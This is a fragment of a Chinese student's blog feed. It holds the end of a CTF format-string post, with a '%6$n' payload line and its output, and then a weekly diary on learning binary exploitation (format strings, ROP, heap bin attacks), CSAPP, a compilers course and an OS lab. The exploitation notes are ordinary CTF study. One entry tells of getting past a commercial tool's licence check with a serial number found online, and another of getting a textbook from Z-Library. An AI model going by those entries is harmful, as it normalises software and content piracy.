class="hljs-meta">aaaaaaaaaaaaaaaa%</span><span class="bash">6<span class="hljs-variable">$n</span></span><br>aaaaaaaaaaaaaaaa<br>10<br>you pwn me!<br><span class="hljs-meta">$</span><br></code></pre></div></td></tr></table></figure><p>成功！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily</title>
    <link href="/2021-06/Sky-Learning-Daily/"/>
    <url>/2021-06/Sky-Learning-Daily/</url>
    
    <content type="html"><![CDATA[<h2 id="属于pwn的时间"><a href="#属于pwn的时间" class="headerlink" title="属于pwn的时间:"></a>属于pwn的时间:</h2><h3 id="第0周-6-7-6-13"><a href="#第0周-6-7-6-13" class="headerlink" title="第0周:6/7-6/13"></a>第0周:6/7-6/13</h3><ul><li>11: 为了ida成功把kali2020.3整莫得了, 不想去研究怎么复原了, 直接重装了个kali2021.2, 以后一定弄<strong>快照</strong>.</li><li>12: 弄明白了cachelab的食用方法, 直接ctrlcv代码理解了下, 但是看起来还是有很多可以改进的地方, 暂时看不进去了. <ul><li>typora装的时候apt-key出问题, 其实还能用几年, 更modern的解决办法<a href="https://suay.site/?p=526">在这</a>(还没看).</li><li>问题列表还是Markdown靠谱, 思维导图线太多了, 用不上结构的优势, 除了笔记还是用md吧.</li></ul></li><li>13: 今天计划看看那啥buuoj的题目: 没看懂从哪开始, 还在wiki中<ul><li>typora linux版命令行启动好像有点问题</li><li>啥玩意儿啊, 根本不知道怎么开始做ctf题目-&gt;搞懂了ssh连接到靶机, 结果做到第二题发现是web, 请求学不到家干脆放弃了.</li><li>看了点讲座的内网穿透, 有丶意思, 可惜我没有这种需求</li></ul></li></ul><h3 id="第一周-6-14-6-20"><a href="#第一周-6-14-6-20" class="headerlink" title="第一周:6/14-6/20"></a>第一周:6/14-6/20</h3><ul><li>啥也没干, 复习周</li></ul><h3 id="第二周-6-21-6-27"><a href="#第二周-6-21-6-27" class="headerlink" title="第二周:6/21-6/27"></a>第二周:6/21-6/27</h3><p>……………..</p><h3 id="第一周-7-10-7-11"><a href="#第一周-7-10-7-11" class="headerlink" title="第一周:7/10-7/11"></a>第一周:7/10-7/11</h3><ul><li><strong>10,11: 直接盲选了一手系统安全, 要开始学逆向之类的东西了.</strong> <ul><li>看了看洛神的攻防世界的题解, 看了第一道题我就下载了pwntools ida peda这三个工具, 用了下checksec看看文件的类型, 再试了试nc命令连接到服务器, 运行一下就得到了flag</li><li>第二题是关于格式化字符串漏洞的, 看了老半天, 洛神直接写个很明显, 真不知道他写这个的时候是什么水平, 我还啥都不会呢. 哦对, 我看到一半他居然写了个python, 还是用的pwntools的接口, 人傻了, 明天入门python去, 然后再看看pwntools的python写法</li></ul></li></ul><h3 id="第二周-7-12-7-18"><a href="#第二周-7-12-7-18" class="headerlink" title="第二周:7/12-7/18"></a>第二周:7/12-7/18</h3><ul><li><p><strong>12:这周不做CG了, 开始研究CTF</strong>.</p><ul><li>今天先入门个python先.</li></ul></li><li><p><strong>13: 今天打算学习pwntools的用法</strong>.</p><ul><li>python看到了package,  看过了import, 各种基本类型的用法, 类还没看.</li><li><a href="https://pwntools.readthedocs.io/en/latest/tubes/sockets.html#module-pwnlib.tubes.remote">pwnlib.tubes</a>, 这里有很多东西, 可以直接网页打开然后去搜函数, unpack()和pack()的作用是将数字打包成可输入的字符串</li><li>vscode装python还是挺简单的</li><li><code>%&lt; number&gt;$x</code> 是直接存放到第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.<ul><li>在%10n是啥以及为啥要加‘AAAA’这些问题上卡了半天. <a href="https://bbs.pediy.com/thread-253638.htm">[0]</a>.</li><li><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是<strong>对应参数（这个参数是指针）</strong>的对应的地址开始起几个字节。<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">[0]</a>.</li></ul></li></ul></li><li><p><strong>14: IDA东西好多, 也看了看pwntools的文档, 特么也太多了</strong>.(level2整完了, 明天看看文档告别硬编码!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!(先会看再说))</p><ul><li><code>var_4 = dword ptr -4；</code>  这是解释代码，可解释成var_4 是 esp - 4处的空间;<br><code>var_0 = dword ptr 8;</code>      var_0 是 esp +8处的空间；<img src="https://i.loli.net/2021/07/19/LtySjIVDrhfwlk7.png"></li></ul></li><li><p><code>/bin/bash</code>是个好东西, 如果能调用这个可以直接跳转到命令行模式, <code>interactive()</code>打开后就能发命令了</p><p><img src="https://i.loli.net/2021/07/19/TrCMBZjQpANFYhK.png"></p></li><li><p>将悬浮窗口复位: reset the desktop (md变成悬浮窗口就变不回去了??????????)</p><ul><li>芜湖, <strong>savedesktop</strong>还挺好用, 设置了一个我现在水平够用的default</li></ul></li><li><p>shift+F12: <u>strings window</u>.(还有f6,shift+f6,alt+f3)</p></li><li><p>汇编语言<a href="https://blog.csdn.net/weixin_43229030/article/details/106799580#15_comment_field_166">伪指令</a>.   a db 17 dup(?)的<a href="https://zhidao.baidu.com/question/2198876873686806628.html">含义</a>.</p></li><li><p>奇怪的信息: </p><img src="https://i.loli.net/2021/07/19/pYrMl7BxPmhfzUs.png" style="zoom: 50%;" /></li><li><p>python: next()函数和search()的返回是一个可迭代的类型</p></li><li><p><em><strong><u>在32位程序运行中，函数参数直接压入栈中</u></strong></em>,(还能这样???????????????????????????????????)</p><p>(64位汇编传参，当参数少于7个时， 参数<strong>从左到右</strong>放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时，<br>前 6 个与前面一样， 但后面的依次**”从右向左”**放入栈中，即和32位汇编一样。)</p><p>调用函数时栈的结构为:调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;…-&gt;参数1</p></li><li><p><strong>15: 上午还是IDA的使用, 下午再看文档. 下午也没看,</strong> .</p><ul><li>return __readfsqword(0x28u) ^ v4; 这个是金丝雀值canary的检测</li><li><u><em>重启大法好</em></u>.(好个屁, 还是没解决)</li><li>千万别把文件名称命名为模块名称, 不然会出错.</li><li>sendlineafter的 <strong>“\n”</strong>一定要看清楚了再加</li><li>函数栈帧的构建过程, <strong>会把ebp推到栈上</strong>.</li><li>看看Jump菜单里的快捷键!</li><li>刚进入函数时, 栈顶是返回地址!</li></ul></li><li><p><strong>16: 今天不知道能做多少, 早上姑且整完了adworld的writeup, 下午晚上看情况, 开始buuoj</strong>, </p><ul><li><p>看了剩下的tutorial, 一些看不懂, 有用到再说吧</p></li><li><p>RWX权限: r代表读权限，w代表写权限，x代表执行权限</p><p>相关的<a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod命令</a> </p></li><li><p><a href="https://blog.csdn.net/weixin_43655282/article/details/105334313">retn</a>与<em>堆栈平衡或内存对齐</em>   (适用于<strong>Ubuntu18</strong>及以上的版本).</p></li></ul></li><li><p><strong>17: 今天在动车上姑且做到了第七题, 并且下载好了LibcSearcher库, 明天开始拿下第七题</strong> </p><ul><li>看懂了python2和python3中的字符串的<a href="https://blog.csdn.net/sinat_38682860/article/details/91046433">区别</a>(复习了<a href="https://www.zhihu.com/question/23374078">Unicode和UTF-8</a>), python3 加上的就是这两种类型<strong>不能混用</strong> </li><li>整明白了eip寄存器(<a href="https://www.cnblogs.com/xiangtingshen/p/11089563.html">1</a>,  <a href="https://www.k2zone.cn/?p=1911">2</a>)和堆栈平衡的东西, 明天再写篇文档顺便整理整理越来越多的md文件.</li></ul></li><li><p><strong>18:整了个blog, hexo+Github</strong>.</p></li></ul><h3 id="第三周-7-19-7-25"><a href="#第三周-7-19-7-25" class="headerlink" title="第三周: 7/19-7/25"></a>第三周: 7/19-7/25</h3><ul><li><p><strong>19: 终于弄完了github上的blog, 以后就这样发东西了</strong> </p><ul><li>python3 -m pydoc -p 0 : 可以查看本地文档</li></ul></li><li><p><strong>20: 白天看python的语法, 看到了formatted_string, 晚上继续做题BUUOJ看LibcSearcher</strong> </p><ul><li><strong><a href="https://yogdzewa.github.io/2021-07/pwn-ROPgadgetDoc/">ROPgadgetDoc</a> or <a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">anotherIntroduce</a></strong> </li><li>**hide的文章可以通过网址访问</li><li>pwn查找字符串的<a href="https://blog.csdn.net/weixin_43921239/article/details/105318835">方法</a>.(指查找程序中的字符串|查找 libc 中的字符串之类的)</li></ul></li><li><p><strong>21: 继续OJ</strong> </p><ul><li>虚拟机里vim的复制粘贴好像有点特别</li><li>今天才做了两道题pwn+babyrop, 我觉得需要反思下到底哪里慢了<ul><li>主要还是想自己摸索, 结果好多东西看别人的学得更快, <strong>又叒叕</strong>复习了一遍%n是修改<strong>指针</strong>指向的值(源自CGfsb), c语言函数有点不太熟悉(strlen就是, 没反应过来是以’\0’为止的, 以及strncmp返回值和第三个参数即长度为0时两个字符串相等), 今天看文档也用了不少时间(fmtstr_payload, flat, pack等), 总的说来学得还算不少, 不过感觉还是有点慢(｀⌒´メ)</li></ul></li></ul></li><li><p><strong>22: 继续</strong> </p><ul><li>linux <u>终端suspend问题</u>: pressing the ctrl+z is to suspended current process <a href="https://www.cnblogs.com/jiangzhaowei/p/8971265.html"><strong>[0]</strong></a>.</li><li>python3 用pwntools什么东西都得加一个b, 绝了.<br>“/bin/sh”没加也报错, 还有ELF.search返回的是一个可迭代的对象<br>sendlineafter没加b也在那里给警告<br>简单题多做几遍还能多几次收获, 哇, 哇</li><li>IDA 逆向<a href="https://blog.csdn.net/huiguixian/article/details/52026710">常用宏定义</a> </li><li>pwntools的context默认32位, 还是每次手动设定的好,  推荐使用:<code>context.binary = &#39;./challenge-binary&#39;</code>.<img src="https://i.loli.net/2021/07/22/ueHT3S7ComhkflA.png" alt="image-20210722202114278" style="zoom: 67%;" /> </li><li>查找字符串-&gt;flag.txt-&gt;Ctrl+X, Jumptothereference-&gt;继续<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//常见函数:</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getc</span><span class="hljs-params">(FILE *stream)</span>                                   <span class="hljs-comment">//返回字符的int类型值</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> n, FILE *stream)</span></span>;              <span class="hljs-comment">//从文件流中读取字符到str中</span><br><span class="hljs-function">FILE *<span class="hljs-title">fopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)</span></span>;    <span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;    <span class="hljs-comment">//一般是write(1,buf,nbyte),stdout = 1</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sys_read</span><span class="hljs-params">(stdinput:<span class="hljs-number">0</span>, buf, size)</span></span><br><span class="hljs-function"><span class="hljs-comment">//习惯上，标准输入的文件描述符是 0，标准输出是 1，标准错误（standard error）是 2。</span></span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>bss段原理: executable文件中只记录未初始化变量的起始和终止地址, 在运行时操作系统将这部分内存清零</p></li><li><p>可以直接sendline, 不一定要一直用sendlineafter.</p></li><li><p><strong>23: 还是继续</strong> </p><ul><li>复习了一下<a href="https://www.cnblogs.com/tcctw/p/11333743.html">栈帧对齐</a> </li><li>发现自己对linux的系统函数不熟导致做题不清楚(包括/bin/sh和sh是一样的, 都在系统路径里), 准备重补CSAPP里的Linux函数</li><li><a href="https://blog.csdn.net/zhizhengguan/article/details/112338314">getegid等等</a> </li><li>明天补补CTF-WiKi上的东西, 感觉还挺有用的(因为最新一题要用到fastbin attack……….)</li></ul></li><li><p><strong>24-25: 补补知识</strong> </p><ul><li>复习了下<a href="https://www.cnblogs.com/killerlegend/p/3906502.html">AT&amp;T和Interl语法</a> </li><li>LONG_MAX = INT_MAX</li><li><h3 id="第四周-7-26-8-1"><a href="#第四周-7-26-8-1" class="headerlink" title="第四周: 7/26-8/1"></a>第四周: 7/26-8/1</h3></li></ul></li><li><p><strong>26-28: 划水+看CTF-WiKi上的heap内容</strong> </p></li><li><p><strong>29: 继续WiKi</strong> </p><ul><li><code>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</code> </li><li>我居然还在看WiKi, 关键是他的东西也太多了吧, 之前还以为可以跳过的, 结果全都得倒回去看原理和代码, 这波真的是大意了. 堆的相关内容真的好长</li><li>fastbin是单链表, 所以元素的用户数据段前八字节有数据, 且是fd</li><li><strong>fd_nextsize， bk_nextsize</strong>是largebins的指针<code>#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</code></li><li>至少包含bk指针, largebins的特有指针可以不要</li><li>奇了怪了, 看了半天才看出来fastbins里的链表头指针数组的数量是<code>maxsize</code>的字节数, 所以才有<code>fastbin_index(chunksize(victim))</code>这种用字节数定位下标的算法, 好像真的没有一句明白的话说明这玩意儿, 绝了, 看了半天源码才看出来……..<br>还是乖乖看源码吧……..</li></ul></li><li><p><strong>30:看懂了fastbinattack</strong></p><ul><li>nextchunck是指高地址的那一个</li><li><strong>malloc_consolidate</strong> 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</li></ul></li><li><p>31: </p><ul><li><a href="https://github.com/longld/peda">gdb-peda</a> <h3 id="第五周-8-2-8-8"><a href="#第五周-8-2-8-8" class="headerlink" title="第五周: 8/2-8/8"></a>第五周: 8/2-8/8</h3></li></ul></li><li><p><strong>8/2 3: 做题</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">pwndbg和Pwngdb</a> </li><li>关于gdb.attach(p)的<a href="https://www.jianshu.com/p/fc91ff8319e6">几句话</a> </li><li>查询各版本libc.so文件的main_arena_offset的<a href="https://github.com/coldwave96/libcoffset">小工具</a> </li><li><strong>而且recv是从缓冲区获取数据, 必须把前面的都取出来才能够recv(4)</strong> </li></ul></li><li><p><strong>8/4,5: 做题</strong> </p><ul><li>系统调用号在32位和64位系统是不一样的. <a href="https://giantbranch.blog.csdn.net/article/details/78777938">查询表</a> </li><li>关于libc_csu的内容在<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_1">CTF_WiKi</a>中</li><li>additionally <strong>recursively dereferencing</strong> all pointers.<img src="https://i.loli.net/2021/08/04/GAxeO2D67LfbKPw.png" alt="image-20210804234240069" style="zoom:80%;" /></li><li>flat和pack只对数字生效, 对不足四字节或八字节的数据请自行填充完整</li><li>gdb.attach用法 <code>io = gdb.debug(&#39;./hello&#39;, [gdb_scrip])</code> 注意要写路径</li><li>已放弃gdb.attach(), 实在搞不明白怎么用</li></ul></li><li><p><strong>8/6: 学习</strong> </p><ul><li><p>gdb中<strong>默认关闭随机化</strong>, 使用show disable-randomization或set disable-randomization off关闭“<strong>禁止随机化</strong>”</p><p><a href="https://www.dazhuanlan.com/ourlaputa/topics/975254">关于ASLR和PIE详细内容</a>, 前者是Linux系统特有打乱所有的东西, 后者是编译器加上的保护措施, PIE会打乱bss text data加载基址, 不过这是一个固定值, 当我们打开了Linux的ASLR 2才能够真正的<strong>随机</strong>.</p></li><li><p>整理writeup</p></li></ul></li><li><p>**8/7:继续 ** </p><ul><li>看完了堆的全部基础内容, 还剩下各种利用方法没看</li><li>了解了一波<strong>SROP</strong>, 尝试写了一题(其实是某题的第二种方法)</li><li>BUUOJ好几道都是做过的或者很相似的题目, 相当于复习了也比较基础</li></ul></li><li><p><strong>8/8:继续</strong> </p><ul><li>看了看栈转移和asm(shellcraft), 以及<a href="https://support.typora.io/Draw-Diagrams-With-Markdown/">Typora的图表文档</a> <a href="https://github.com/adrai/flowchart.js">[flowchart github]</a> <a href="https://mermaid-js.github.io/mermaid/#/flowchart">[mermaid]</a> </li><li>学习unsorted bin attack, <code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量</li><li><a href="https://github.com/shellphish/how2heap">heap exploitation: how2heap</a> </li></ul></li></ul><h3 id="第六周-8-9-8-15"><a href="#第六周-8-9-8-15" class="headerlink" title="第六周: 8/9 - 8/15"></a>第六周: 8/9 - 8/15</h3><ul><li><p><strong>8/9:今天看GNU C Library源码(关于heap)</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43833642/article/details/104681190">glibc源码下载&amp;在线阅读地址合集</a> </li><li>写点heap源码的笔记</li></ul></li><li><p><strong>8/10,11,12:继续源码</strong></p><ul><li><a href="https://qzy.im/blog/2020/05/typora-integrate-the-latest-version-of-mermaid/">Typora不支持最新Mermaid语法的解决办法</a> </li><li>学了下mermaid的用法(或许将来能用到), 还有app.diagram.net的画图</li><li>按住ctrl用鼠标点击多个地方可以同时编辑</li><li>华庭的glibc解析中chunk size链表即为largebin的fd_nextsize和bk_nextsize</li><li>&lt;span id=”jump”&gt;跳转到的地方&lt;/span&gt;    跳转本页锚点的方法</li></ul></li><li><p><strong>8/13:搞定malloc.c中除了多线程的所有源码</strong> </p><ul><li>emmmmm我是不是要补补多线程的东西, 总不能一直都不知道吧, 明天我去问问还能拖到什么时候学(bushi)</li></ul></li><li><p><strong>8/14-15:写各种bin attack的分析文, 写完打算入坑ucore Lab1</strong> </p><ul><li><a href="https://blog.csdn.net/Katherine_hsr/article/details/79179622">makdown数学公式</a> </li><li><a href="https://blog.csdn.net/xiaojin21cen/article/details/90292315">修改theme</a> </li></ul></li></ul><h3 id="第七-八周-8-16-8-29"><a href="#第七-八周-8-16-8-29" class="headerlink" title="第七,八周: 8/16-8/29"></a>第七,八周: 8/16-8/29</h3><ul><li><strong>bin attack &amp; easyheap</strong> <ul><li>出现了glibc版本问题, 需要再将源码分析和最新版本<code>2.34</code>比对一下 </li><li>直接执行.so文件来查看glibc版本</li><li><a href="https://www.cnblogs.com/qisi007/p/13731562.html">Gittalk插件</a> </li></ul></li><li><strong>补完了CSAPP上signal的部分, 不得不说内容真的是太多了</strong> </li></ul><h3 id="第九周-8-30-9-5"><a href="#第九周-8-30-9-5" class="headerlink" title="第九周: 8/30-9/5"></a>第九周: 8/30-9/5</h3><ul><li><strong>志愿者+shellab</strong> <ul><li>getopt()    strchr()</li><li><strong>Ctrl+z</strong> 发送的是 <strong>SIGTSTP</strong> </li><li>Kali 上unsigned long int长8字节, 我在windows上用g++是4字节和int一样长</li><li>architecturelab还没做, 都不知道要不要弄了, 书上好多还没看又得要几天</li><li>继续CSAPP, 怎么还没看完啊…….</li><li><em><strong>重大教训</strong></em>, 在Z-Library上找到了csapp的英文非扫描版, 终于不用在笔记排版上浪费那么多的时间了</li><li>8/5 看到了处理器体系结构第三节</li></ul></li></ul><h3 id="第十周-9-6-9-12"><a href="#第十周-9-6-9-12" class="headerlink" title="第十周: 9/6-9/12"></a>第十周: 9/6-9/12</h3><ul><li><strong>CSAPP</strong> <ul><li>process architecture看了一天半看不下去了, 还有剩下的Network &amp; Concurrent Programming以后再找机会看吧</li></ul></li><li><strong>Rust</strong> <ul><li><u>看了五天的Rust Official Document</u>, 相当于是应了肖老师的建议, 不过看了一大半之后还能继续做什么还没有思考, 不过大概率不去做网页组的事情了</li><li>妄图和肖哥比确实是一种自不量力的行为, 我要好好反思一下自己要走的路</li></ul></li><li><strong>BUUOJ</strong> <ul><li>做个几题意思一下</li></ul></li></ul><h3 id="第十一周-9-13-9-19"><a href="#第十一周-9-13-9-19" class="headerlink" title="第十一周: 9/13-9/19"></a>第十一周: 9/13-9/19</h3><ul><li><strong>又看了一下<a href="http://www.voidcn.com/article/p-yxixqubd-bmr.html">checksec</a>的保护机制</strong> </li><li>准备了一手CCF CSP, 虽然没学算法的大家都是一个水平</li><li>做个两题</li></ul><h3 id="第十二周-9-20-9-26"><a href="#第十二周-9-20-9-26" class="headerlink" title="第十二周: 9/20-9/26"></a>第十二周: 9/20-9/26</h3><ul><li>IDA pro book感觉挺有用的, 抽个时间看看</li><li>上面这本书中的一部分的博客: <a href="https://blog.csdn.net/andiao1218/article/details/101192650">名称与命名</a>, 讲如何更改函数或变量名称</li><li>vim<a href="https://blog.csdn.net/cbaln0/article/details/87979056">查找与替换</a> </li><li>面试V&amp;N的pwn方向, 和当时的肖学长差不多水平, 但是现在的面试比较严格, 叫我再学两个月, 我现在退坑pwn去走一遍肖学长的learn list补补基础(编译原理和操作系统)</li><li>太忙了, 搞综测, 又没周末, 实验又多, 下周再学吧</li></ul><h2 id="操作系统-编译原理"><a href="#操作系统-编译原理" class="headerlink" title="操作系统+编译原理"></a>操作系统+编译原理</h2><h3 id="第十三周-9-27-10-7-8-9-10-国庆全算进去吧"><a href="#第十三周-9-27-10-7-8-9-10-国庆全算进去吧" class="headerlink" title="第十三周: 9/27-10/7+8+9+10(国庆全算进去吧)"></a>第十三周: 9/27-10/7+8+9+10(国庆全算进去吧)</h3><ul><li><p><strong>10/1-2 : 编译原理</strong></p><ul><li>刚开始编译原理，操作系统的话看看有无必要同时进行</li><li>编译原理概念过多, 暂缓几天, 现在先看操作系统</li><li>这几天打算看看CSAPP的并行部分(tmd怎么还没看完, 笔记不做了就画个线好了)</li></ul></li><li><p><strong>10/3 : 操作系统</strong> </p><ul><li>在弄ucore环境, 加入了新的vim<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_2_3_1_softwares.html">命令</a>, 包括<a href="https://www.cnblogs.com/marsggbo/p/12152374.html">这个</a>.</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/">ucore实验参考书</a> </li><li>GCC内联汇编<ul><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_3_gcc_inline_asm.html">基本内联汇编</a><br><code>&quot;asm&quot; 和 &quot;__asm__&quot;</code>, 如有多行每一行都要加上 <code>&quot;\n\t&quot;</code>,<br>实际上gcc在处理汇编时，是要把asm(…)的内容”打印”到汇编文件中，所以<strong>格式控制字符</strong>是必要的。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_4_extend_gcc_asm.html">扩展内联汇编</a> 详见网站 好复杂, 用时再看<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">asm</span> [<span class="hljs-keyword">volatile</span>] ( Assembler Template<br>   : Output Operands<br>   [ : Input Operands<br>   [ : Clobbers ] ] )<br></code></pre></div></td></tr></table></figure></li></ul></li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_3_gdb.html">gdb基本命令以及窗口命令</a> </li><li>下午改学编译原理</li></ul></li><li><p><strong>10/4 : 编译原理</strong> </p><ul><li><a href="http://c.biancheng.net/linux/ln.html">ln命令|symbolic_link</a> </li><li>安装好PA环境, 开始cs143第一个实验</li><li>(看了学校的课程:数据库系统)</li><li>软件安装问题<ul><li>芔, 根本没装好, 为了在kali上做实验整了半天flex安装, 一直给我提示缺少GNU m4, 我寻思哪里都没见过这东西啊, 找了半天m4也装了半天, 结果发现直接apt install就行了, m4的版本不重要, 重要的是flex低版本的源码级安装(也不知道有没用, 先装了再说)(<strong>后来还是用了apt install flex</strong>)</li><li>文章里说的<code>./configure &amp;&amp; make &amp;&amp; sudo make install</code>就是在相应文件夹下执行就可以了</li><li>apt自动管理软件的依赖问题, 各种命令直接搜索即可</li><li><a href="https://www.cnblogs.com/EasonJim/p/7144017.html">Ubuntu通过apt-get安装指定版本和查询指定软件有多少个版本</a> </li></ul></li></ul></li><li><p><strong>10/5 : 编译原理</strong> </p><ul><li>Ibus打出<code>&quot;安&quot;</code>需要按下A+J(an) , 真特么奇怪</li><li>Linux下<code>!</code>的<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">用法</a>, 主要是传递最后执行的命令的参数，以方便的运行新命令(非常实用)</li><li>COOL文档看了一半, tour文档刚开头, 这种长文章确实<strong>耗时间</strong>, 晚上看完PA1吧, 就不自己写了</li><li>xodo不要拖动pdf文件查看, 会出现无法保存的情况</li><li>看了一天的英文文档, 属实快累死了, 终于到了PA2</li></ul></li><li><p><strong>10/6 : 继续苦逼编译原理</strong> </p><ul><li>有点其他事, 继续看了文档</li></ul></li><li><p><strong>10/7-10 : 还是看文档</strong> </p><ul><li>课程看了两天, 实验相关只花了一下午看</li><li><strong>#line 命令(还是没懂)</strong> <ol><li>#line 行号<br>其中行号必须是1~32 767之间的整数，此指示导致程序后面的行被编号为n,n+1,n+2,…</li><li>#line 行号 “文件名”<br>其中行号和文件名说明来源的行号和文件名，指示后面的行会被认为是来自文件，行号由n开始。<br>​    #line指示一种作用是改变__LINE__,__FILE__宏的值。但是大多数编译器不支持#line。#line 主要用于那些产生C代码作为输出的程序，程序员并不常用#line。</li></ol></li><li><strong>看了这么多天文档终于会写代码了, 好感动(╥╯^╰╥)</strong> </li></ul></li></ul><h3 id="第十四周-10-11-10-17"><a href="#第十四周-10-11-10-17" class="headerlink" title="第十四周: 10/11-10/17"></a>第十四周: 10/11-10/17</h3><ul><li><p>终于整完了cool.flex, 开始看parse部分</p></li><li><p>flex的源码分析抽空看一看, 只写cool.flex还是忽略了一些细节</p></li><li><p>救命啊, 这编译原理也太猛了, 概念多得离谱, 词法+语法分析是能够一周完成的任务吗???</p><p><del>不过还能学下去就是了, 如果是实验的话应该会省略掉一些细节, 毕竟课程还是啥都讲, 从劣到优全都介绍一遍</del></p><p>已经学不下去了</p></li><li><p>学傻了, cool文档哪里看的过来啊</p></li></ul><h3 id="第十五周-10-18-10-24"><a href="#第十五周-10-18-10-24" class="headerlink" title="第十五周: 10/18-10/24"></a>第十五周: 10/18-10/24</h3><ul><li>我以为我看完文档了, 结果又看到产生式里面给我来一个<code>error &#39;;&#39;</code>人又蒙了, 一看Bison文档在第六章, 我就差这个没看呢, 不过后面的章节应该不是很重要了, 就算做我看完了吧:cry: </li><li>21号, 手写数据库命令行, 练习一下纯命令形式的数据库管理, 以及查看文档的水平, 但没想到的是会错在书上的错误示例中:cold_sweat: </li><li>周末用了一天时间写数据库, 比较忙</li><li>?</li></ul><h3 id="第十六周-10-25-10-31"><a href="#第十六周-10-25-10-31" class="headerlink" title="第十六周: 10/25-10/31"></a>第十六周: 10/25-10/31</h3><ul><li>服啦, 还是不要想着三个星期整完编译原理了, 毕竟至少一个月打底了</li><li>这几天还是在看视频. 就这视频是能几个星期看完的???还剩下PA45没做</li><li>感天动地, PA4终于能看懂了, 周末尽量争取PA5开个头:ghost: </li><li>把所有文件的关系理一遍终于看懂了PA4, 也对PA3和PA2有了更清楚的理解, 果然还是要把源码看一遍才懂写下去的都是些什么类型什么变量. PA5我还是先看看视频吧, 勉强算作一个开头</li><li>一个小问题是kali中<strong>使用中文输入法的时候无法在vscode中用光标选中文本</strong> </li></ul><h3 id="第十七周-11-01-11-07"><a href="#第十七周-11-01-11-07" class="headerlink" title="第十七周: 11/01-11/07"></a>第十七周: 11/01-11/07</h3><ul><li>10/01-02: 听了两天的Stanford的课程感觉针不戳, 除了听力没有好到不用看字幕之外看的非常舒服, 不过全看一遍要花非常多的时间, 所以现在改为看PDF, 而PA5会尽快提上日程</li><li>vscode的快捷键真的是超乎想象, 有机会就去看一点</li><li>CSAPP没读完真是硬伤, 关键是哪有看那么快的啊.. 周六开始看网络编程部分, 后续可能补完处理器体系结构(没有然后了)</li><li>看了一点汇编代码MIPS的manuals, 了解了下label是个啥(现在忘了)</li><li>编译原理终于完成了, 下一阶段操作系统+中间代码优化</li><li>开始一点点操作系统</li></ul><h3 id="第十八周-11-08-11-14"><a href="#第十八周-11-08-11-14" class="headerlink" title="第十八周: 11/08-11/14"></a>第十八周: 11/08-11/14</h3><ul><li><strong>11/08:</strong> <ul><li>网上随便整了个<a href="https://blog.csdn.net/weixin_43940314/article/details/111279768">序列号</a>就通过了understand的验证, 这软件还真够直接的, 不过我更想在我的kali上弄这些, 先用着试试看. <a href="https://www.cnblogs.com/wayne-tao/p/11911566.html">这是windows的</a> </li><li>rpm包的命名规范官网, →<a href="https://rpm-packaging-guide.github.io/#epoch">这里</a>.        3:3.1被认为比2:3.2更新。</li><li>好像第二次查硬链接和软连接的区别了, 起因是无法使用qemu而要<strong>使用qemu-system-i386或qemu-system-x86_64指令替换qemu指令.</strong> 可以利用软链接<code>ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu</code>创建一个快捷方式一样的东西</li><li>操作系统的kali环境算是弄好了一大半(我再也不敢说已经弄好了), 剩下的就是要熟悉一下各种软件的操作</li></ul></li><li>其余时间<ul><li>整了两三行的bat一键上传blog</li><li>blog图片换成了本地, 还是怕sm.ms跑路, 以前的就不更新了. 找到了一个最保险的办法, 就是两边都存</li><li><code>dpkg-reconfigure tzdata</code>搞定kali时间不准问题</li><li>装上understand, 压缩包已存, 下载<a 